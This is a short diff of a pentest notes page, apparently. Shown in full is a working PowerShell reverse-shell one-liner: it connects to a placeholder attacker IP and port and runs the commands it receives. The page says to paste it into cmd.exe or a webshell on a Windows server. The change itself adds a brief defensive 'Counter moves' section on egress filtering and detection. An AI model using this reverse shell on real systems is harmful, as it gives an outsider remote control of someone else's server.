@@ -174,4 +174,8 @@ The standard one-liner PSH reverse shell:
 
     powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port-number>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
-Copy into a `cmd.exe` shell or another method of executing commands on a Windows server, such as a webshell. 
+Copy into a `cmd.exe` shell or another method of executing commands on a Windows server, such as a webshell.
+
+## Counter moves
+
+Reverse and bind shells are the foothold everything else builds on. Egress filtering and behavioural detection on shell-like process and network patterns are the levers. Defenders' notes on this are under [surviving the reboot](https://blue.tymyrddin.dev/docs/counter/persistence/).
